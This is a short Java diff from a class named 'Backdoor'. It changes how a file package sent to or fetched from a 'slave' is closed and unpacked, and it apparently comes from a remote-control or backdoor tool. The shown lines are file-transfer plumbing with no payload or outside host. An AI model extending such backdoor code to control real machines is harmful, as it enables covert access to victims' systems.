@@ -161,11 +161,11 @@ public final class Backdoor {
 						slave.setContext(filePackage);
 						slave.send(filePackage);
 					} else {
-						// filePackage.close();
-						slave.removeContext(FetchFilePackage.class);
+						filePackage.close();
 						if (onPackage != null) {
 							onPackage.received(slave, filePackage);
 						}
+						filePackage.unpack();
 					}
 				} else
 				// COMMAND
